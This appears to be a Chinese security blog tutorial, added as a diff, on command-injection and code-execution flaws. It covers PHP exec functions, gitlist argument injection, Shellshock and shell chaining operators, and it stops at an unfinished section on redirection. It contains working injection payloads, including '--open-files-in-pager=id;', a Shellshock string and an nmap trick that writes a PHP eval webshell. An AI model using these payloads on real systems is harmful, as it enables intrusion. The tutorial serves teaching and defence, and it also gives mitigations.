@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>命令执行&amp;代码执行（完善中...） | 晚城的海岸线</title><meta name="author" content="Qu4rt3r77"><meta name="copyright" content="Qu4rt3r77"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="命令执行&amp;代码执行命令执行（RCE）漏洞和代码执行漏洞区别如下:  命令执行则是调用操作系统命令进行执行 代码执行实际上是调用服务器网站代码进行执行  命令执行漏洞（RCE）当开发人员调用了执行系统命令的函数，而其中的函数参数用户可以控制，届时就有了利用机会 1.代码层过滤不严格调用的第三方组件存在代码执行漏洞常见的命令执行函数  PHP：exec、shell_exec、system、pa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行&amp;代码执行（完善中...）">
+<meta property="og:url" content="https://quarter77.github.io/undefined/46b9/index.html">
+<meta property="og:site_name" content="晚城的海岸线">
+<meta property="og:description" content="命令执行&amp;代码执行命令执行（RCE）漏洞和代码执行漏洞区别如下:  命令执行则是调用操作系统命令进行执行 代码执行实际上是调用服务器网站代码进行执行  命令执行漏洞（RCE）当开发人员调用了执行系统命令的函数，而其中的函数参数用户可以控制，届时就有了利用机会 1.代码层过滤不严格调用的第三方组件存在代码执行漏洞常见的命令执行函数  PHP：exec、shell_exec、system、pa">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://quarter77.github.io/img/2.png">
+<meta property="article:published_time" content="2024-04-14T07:12:51.431Z">
+<meta property="article:modified_time" content="2024-04-15T05:37:33.547Z">
+<meta property="article:author" content="Qu4rt3r77">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://quarter77.github.io/img/2.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://quarter77.github.io/undefined/46b9/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Qu4rt3r77","link":"链接: ","source":"来源: 晚城的海岸线","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '命令执行&代码执行（完善中...）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-15 13:37:33'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/meun_centered.css?1"><link rel="stylesheet" href="/css/bigger.css?1"><link rel="stylesheet" href="/css/fonts.css?1"><meta name="generator" content="Hexo 7.1.1"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:randomPost();"><i class="fa-fw fa-solid fa-shuffle"></i><span> 随机访问</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/share/"><i class="fa-fw fa fa-share-alt-square"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fa fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.png')"><nav id="nav"><span id="blog-info"><a href="/" title="晚城的海岸线"><span class="site-name">晚城的海岸线</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:randomPost();"><i class="fa-fw fa-solid fa-shuffle"></i><span> 随机访问</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-bookmark"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/share/"><i class="fa-fw fa fa-share-alt-square"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fa fa-images"></i><span> 图库</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><!-- 正确的 #toggle-menu 定义--><div class="navbar-toggle" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">命令执行&amp;代码执行（完善中...）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-14T07:12:51.431Z" title="发表于 2024-04-14 15:12:51">2024-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-15T05:37:33.547Z" title="更新于 2024-04-15 13:37:33">2024-04-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="命令执行&amp;代码执行（完善中...）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="命令执行-代码执行"><a href="#命令执行-代码执行" class="headerlink" title="命令执行&amp;代码执行"></a>命令执行&amp;代码执行</h1><p>命令执行（RCE）漏洞和代码执行漏洞区别如下:</p>
+<ul>
+<li>命令执行则是调用操作系统命令进行执行</li>
+<li>代码执行实际上是调用服务器网站代码进行执行</li>
+</ul>
+<h2 id="命令执行漏洞（RCE）"><a href="#命令执行漏洞（RCE）" class="headerlink" title="命令执行漏洞（RCE）"></a>命令执行漏洞（RCE）</h2><p>当开发人员调用了执行系统命令的函数，而其中的函数参数用户可以控制，届时就有了利用机会</p>
+<h3 id="1-代码层过滤不严格"><a href="#1-代码层过滤不严格" class="headerlink" title="1.代码层过滤不严格"></a>1.代码层过滤不严格</h3><p>调用的第三方组件存在代码执行漏洞常见的命令执行函数</p>
+<ul>
+<li>PHP：exec、shell_exec、system、passthru、popen、proc_open等</li>
+<li>Java：Runtime.exec(String command)、ProcessBuilder(String… command)、ProcessBuilder.Redirect、ProcessBuilder.start()等</li>
+</ul>
+<p>这里有几个常用的系统命令执行函数（PHP）</p>
+<p><strong>exec()：</strong></p>
+<p>执行外部程序，但只返回<strong>最后一行</strong>的输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">bool exec(string $command,array $output,int $return_var)</span><br><span class="line">（必需）$command: 要执行的命令</span><br><span class="line">$output: 一个引用数组，用于存储命令的输出</span><br><span class="line">$return_var: 一个引用变量，用于存储命令的退出状态</span><br><span class="line">（如果外部程序成功执行，返回 0；如果执行失败，返回一个非 0 的值）</span><br></pre></td></tr></table></figure>
+
+<p><strong>system()：</strong></p>
+<p>执行外部程序并显示输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">string system(string $command, int $return_var, array $output)</span><br><span class="line">（必需）$command: 要执行的命令</span><br><span class="line">$return_var: 一个引用变量，用于存储命令的退出状态</span><br><span class="line">$output: 一个引用数组，用于存储命令的输出，这个参数是 PHP 5.0.0 以上版本的扩展参数，用于捕获命令的输出</span><br></pre></td></tr></table></figure>
+
+<p><strong>shell_exec()：</strong></p>
+<p>执行一个通过 shell 调用的命令，并将完整的输出捕获为字符串返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">string shell_exec(string $command)</span><br><span class="line">$command: 要执行的命令，如果命令执行失败或者命令没有输出，返回 NULL</span><br></pre></td></tr></table></figure>
+
+<p><strong>passthru()：</strong></p>
+<p>执行外部程序，并将原始输出<strong>直接传递给浏览器</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">void passthru(string $command ,array $output)</span><br><span class="line">（必须）$command: 要执行的命令</span><br><span class="line">$output: 用于存储命令的输出。然而，尽管提供了这个参数，passthru() 并不会使用它来捕获输出，因为输出会被直接发送到浏览器。这个参数在 passthru() 函数中实际上是被忽略的</span><br></pre></td></tr></table></figure>
+
+<p><strong>区别：</strong></p>
+<p>总体而言，system()、passthru()函数是可以不需要echo来进行显出的，而exec()、shell_exec()是需要的；此外，除passthru()外引入变量进行储存输出结果是为了方便进行后续处理，对于system函数要用到缓冲输出ob_start()，使其不会立马显示输出结果，并且可以对其进行后续处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ob_start(); </span><br><span class="line">system(&#x27;ls -l&#x27;);</span><br><span class="line">$output = ob_get_clean(); </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>system 是最灵活的，可以捕获输出并获取退出状态</li>
+<li>exec 类似于 system，但只返回最后一行输出</li>
+<li>shell_exec 用于获取整个命令的输出结果</li>
+<li>passthru 用于直接将命令的原始输出传递给浏览器</li>
+</ul>
+<p><strong>popen()：</strong></p>
+<p>打开一个管道，以便与一个程序建立通信，返回一个文件指针，可以用来读取或写入数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">popen(string $command, string $mode): resource | false</span><br><span class="line">$command 是必需的参数，指定要执行的命令</span><br><span class="line">$mode 是必需的参数，指定连接模式</span><br><span class="line">&#x27;r&#x27;: 只读模式</span><br><span class="line">&#x27;w&#x27;: 只写模式（打开并清空已有文件或创建一个新文件）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在，如果对于用户的命令输入不进行过滤，当输入ls -l、rm -rf等可查看当前目录所有文件夹或者删除文件，这些命令会造成极大的危害，我们可以通过建立<strong>白名单</strong>的方式去限制用户的输入；也可以通过PHP配置文件里disable_functions &#x3D; 配置，禁止某些PHP函数</p>
+<h3 id="2-escapeshellarg-escapeshellcmd-函数"><a href="#2-escapeshellarg-escapeshellcmd-函数" class="headerlink" title="2.escapeshellarg()&#x2F;escapeshellcmd()函数"></a>2.escapeshellarg()&#x2F;escapeshellcmd()函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg(string$arg):string 在参数的两边加上单引号（Windows中是双引号），并对内部的单引号进行转义（确保用户只传递一个参数给命令）</span><br><span class="line"></span><br><span class="line">escapeshellcmd(string$command):string 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，确保用户输入的数据不会影响shell命令的结构，保证用户输入的数据在传送到 exec()或 system()函数，或者执行操作符之前进行转义（*&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$*, \x0A和\xFF）（确保用户只执行一个命令）</span><br></pre></td></tr></table></figure>
+
+<p>这两个函数在php本意是防止用户输入的数据被解释为shell命令的一部分，从而执行未授权的命令，但依旧可以去进行绕过</p>
+<h4 id="escapeshellarg-函数造成的参数注入（gitlist-0-6-0远程命令执行漏洞）"><a href="#escapeshellarg-函数造成的参数注入（gitlist-0-6-0远程命令执行漏洞）" class="headerlink" title="escapeshellarg()函数造成的参数注入（gitlist 0.6.0远程命令执行漏洞）"></a>escapeshellarg()函数造成的参数注入（gitlist 0.6.0远程命令执行漏洞）</h4><p>gitlist是一款使用PHP开发的图形化git仓库查看工具，其中有一部分代码是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function searchTree($query, $branch)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($query)) &#123;</span><br><span class="line">        return null;                            （$query是搜索的关键字，$branch是搜索的分支）</span><br><span class="line">    &#125;</span><br><span class="line">    $query = escapeshellarg($query);</span><br><span class="line">    try &#123;</span><br><span class="line">        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number &#123;$query&#125; $branch&quot;);</span><br><span class="line">    &#125; catch (\RuntimeException $e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>当$query&#x3D;–open-files-in-pager&#x3D;id;时我们看看变成了什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git grep -i --line-number &#x27;--open-files-in-pager=id;&#x27; master</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux 中通常使用 - 或者 -- 来作为选项（Option）的标识符</span><br></pre></td></tr></table></figure>
+
+<p>这里就发生了id命令注入（用于显示当前用户的用户ID和组ID信息），可以看到并不是所有的输入加上单引号都会变成字符串， 原因在于**–open-files-in-pager&#x3D;id;<strong>整体是一个</strong>参数选项<strong>，shell解释器会将–后面的内容视为</strong>参数值<strong>，单引号包裹使之成为字符串的前提是这个字符串应</strong>出现在参数值的位置，并非参数选项**</p>
+<p>参数：参数值是在命令行或函数调用中，用来传递具体数据或信息给程序或函数的部分。<strong>它是某个参数的实际取值</strong></p>
+<p>参数选项：参数选项是用来配置程序或函数行为的标志或开关。它不包含具体的数值，<strong>而是用于启用或禁用某些功能</strong></p>
+<p>对此有以下解决方案：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">git grep -i --line-number -e &#x27;--open-files-in-pager=id;&#x27; master</span><br><span class="line">-e 选项实际上是 git grep 命令的一个参数，后面跟着的是搜索模式 example，即你想要在代码中查找的文本，届时，&#x27;--open-files-in-pager=id;&#x27;就变成了字符串</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">public function searchTree($query, $branch)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($query)) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    $query = preg_replace(&#x27;/(--?[A-Za-z0-9\-]+)/&#x27;, &#x27;&#x27;, $query);</span><br><span class="line">    $query = escapeshellarg($query);</span><br><span class="line">    try &#123;</span><br><span class="line">        $results = $this-&gt;getClient()-&gt;run($this, &quot;grep -i --line-number -- &#123;$query&#125; $branch&quot;);</span><br><span class="line">    &#125; catch (\RuntimeException $e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">这里用preg_replace函数将-开头的非法字符串移除，并拼接在--后面</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="escapeshellarg-和escapeshellcmd-组合使用造成的参数注入"><a href="#escapeshellarg-和escapeshellcmd-组合使用造成的参数注入" class="headerlink" title="escapeshellarg()和escapeshellcmd()组合使用造成的参数注入"></a>escapeshellarg()和escapeshellcmd()组合使用造成的参数注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;nmap&#x27;;</span><br><span class="line">echo $a.escapeshellcmd(escapeshellarg(&quot;&#x27;&lt;?php eval(muma); ?&gt; -oG shell.php&#x27;&quot;))</span><br><span class="line">?&gt;</span><br><span class="line">输出：</span><br><span class="line">namp &#x27;&#x27;\\&#x27;&#x27; \&lt;\?php eval\(muma\)\; \?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>最终将会非法写入一个一句话木马文件</p>
+<h3 id="3-系统漏洞造成命令注入（Bash-Shellshock破壳漏洞CVE-2014-6271）"><a href="#3-系统漏洞造成命令注入（Bash-Shellshock破壳漏洞CVE-2014-6271）" class="headerlink" title="3.系统漏洞造成命令注入（Bash Shellshock破壳漏洞CVE-2014-6271）"></a>3.系统漏洞造成命令注入（Bash Shellshock破壳漏洞CVE-2014-6271）</h3><p>在以前的应用bash的unix&#x2F;linux系统中，进行一些网络服务器部署时，使用bash处理一些请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GNU项目（一种类unix系统）下发布的命令行解释器，有进行一些文本处理，自动化任务等操作功能</span><br></pre></td></tr></table></figure>
+
+<p>在GNU Bash 4.3及之前版本构造的环境变量存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令，可能造成一些远程控制等危害</p>
+<p>如果一个环境变量以**(){**开头，Bash会将其解析为一个函数定义，而不是一个普通的字符串，当我们构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;; ls -l /etc</span><br><span class="line">:是一个空命令，不执行任何操作，但这个环境变量被导出到Bash环境中，Bash在执行env命令（查看当前会话中的所有环境变量及其值）或其他可能触发环境变量解析的命令时，就会泄露/etc目录内容</span><br><span class="line"></span><br><span class="line">x() &#123; ls -l /etc; &#125;或者说我们执行x函数后，也能触发我们的恶意代码（环境变量在子进程解释成了函数执行）</span><br><span class="line"></span><br><span class="line">export shell=x</span><br><span class="line">$shell</span><br><span class="line">现在，当有命令或者是服务触发这个变量时，就会一并执行恶意代码</span><br></pre></td></tr></table></figure>
+
+<p>可以看到漏洞本身在于执行enc命令，其并不能直接造成远程代码执行，要借助第三方（服务程序）作为媒介才能够实现</p>
+<h3 id="4-命令拼接符号及一些绕过方法"><a href="#4-命令拼接符号及一些绕过方法" class="headerlink" title="4.命令拼接符号及一些绕过方法"></a>4.命令拼接符号及一些绕过方法</h3><p>**;**（Unix&#x2F;Linux）   **&amp;**（Windows）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">command1; command2</span><br><span class="line">command1&amp; command2</span><br><span class="line">连续执行多个命令，即使前一个命令失败，后一个命令也会执行</span><br></pre></td></tr></table></figure>
+
+<p><strong>&amp;&amp;</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command1 &amp;&amp; command2</span><br><span class="line">前一个命令成功执行（返回状态码为0）时，后一个命令才会执行</span><br></pre></td></tr></table></figure>
+
+<p><strong>||</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command1 || command2</span><br><span class="line">前一个命令失败（返回状态码非0）时，后一个命令才会执行</span><br></pre></td></tr></table></figure>
+
+<p><strong>|</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">command1 | command2</span><br><span class="line">前一个命令的输出作为后一个命令的输入（参数）</span><br></pre></td></tr></table></figure>
+
+<p><strong>重定向符号</strong></p>
